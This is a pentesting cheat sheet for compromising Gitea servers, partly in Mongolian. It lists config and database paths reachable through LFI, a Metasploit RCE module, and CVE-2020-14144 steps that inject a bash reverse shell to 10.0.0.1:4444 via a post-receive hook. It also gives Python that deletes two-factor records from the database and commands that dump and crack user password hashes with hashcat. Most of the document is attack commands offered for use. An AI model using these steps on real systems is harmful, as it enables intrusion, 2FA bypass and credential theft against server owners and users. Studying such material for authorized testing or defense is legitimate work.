# Gitea

## Git Configuration File

```
LFI-тай ашиглан gitea-ийн бүх config мэдээллийг харах боломжтой.
/home/developer/gitea/data/gitea/conf/app.ini

Тохиргооны файлыг уншин gitea DB-ийн замыг оллоо.
/home/developer/gitea/data/gitea/gitea.db
```

## Common Directories

```
/api/swagger
/api/v1/repos/search?q=test
/api/v1/users/search?q=test
/api/v1/users/<username>/repos
/explore/organizations
/explore/repos
/explore/users

# OAuth
/.well-known/openid-configuration
/login/oauth/authorize
/login/oauth/access_token
/login/oauth/userinfo
/login/oauth/keys
```

## Investigation

**Source Code in Repositories** - If we can access to repositories, we might be able to find sensitive information e.g. credentials, subdomains, other domains, secret keys, etc.

**Go Back to Previous Commits** - We can see the source code of previous commits and find sensitive information accidentally disclosed by committers.

**Get Secrets in Web Hooks** - In the existing repository, we may find the secret value in the repository → Settings → Web Hooks.

**Find User Credentials** - If we have access to the target system and the repository exists in the system:

```bash
cd /path/to/gitea/repo
git config -l
```

## Git Fetch Remote Code Execution (RCE)

### Metasploit

```bash
msfconsole
msf> use exploit/multi/http/gitea_git_fetch_rce
msf> (set options)
msf> run
```

## Git Hooks Remote Code Execution (RCE)

[CVE-2020-14144](https://github.com/p0dalirius/CVE-2020-14144-GiTea-git-hooks-rce) - Affects Gitea version from 1.1.0 to 1.13.

1. Login - Access to the Gitea dashboard and login as the existing account.
2. Create a New Repository
3. Go to Settings → Git Hooks → post-receive
4. Inject the reverse shell payload:

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.0.0.1/4444
```

5. Start Listener:

```bash
nc -lvnp 4444
```

6. Create and push the repository:

```bash
mkdir test
cd test
touch README.md
git init
git add README.md
git commit -m "first commit"
git remote add origin https://<target-ip>/<username>/test.git
git push -u origin master
```

After pushing, git hook triggered and execute the reverse shell command.

## Swagger API

Access `/api/swagger` to interact with Swagger API.

1. Register a new account in Gitea top page.
2. Go to `/user/settings/applications` and generate a new token.
3. Copy the token value.
4. Go to `/api/swagger`.
5. Click "Authorize" button and paste the token.

## Delete the Two-Factor

```python
python3

>>> import sqlite3
>>> conn=sqlite3.connect('gitea.db')
>>> conn.execute('delete from two_factor')
>>> conn.commit()
>>> conn.close()
```

## Dump Credentials in Database

Reference: [Cracking Gitea's PBKDF2 Password Hashes](https://www.unix-ninja.com/p/cracking_giteas_pbkdf2_password_hashes)

```bash
# 1. Open it with sqlite3
sqlite3 /path/to/gitea/data/gitea.db
# 2. Retrieve credentials from the user table
sqlite> select email,salt,passwd,passwd_hash_algo from user;
```

Crack using [gitea2hashcat](https://github.com/unix-ninja/hashcat/blob/master/tools/gitea2hashcat.py):

```bash
python3 gitea2hashcat.py '<salt>|<passwd>'
```

Crack with Hashcat:

```bash
# the -m 1900 may change depending on the hash algorithm.
hashcat -m 10900 '<hash>' wordlist.txt
```
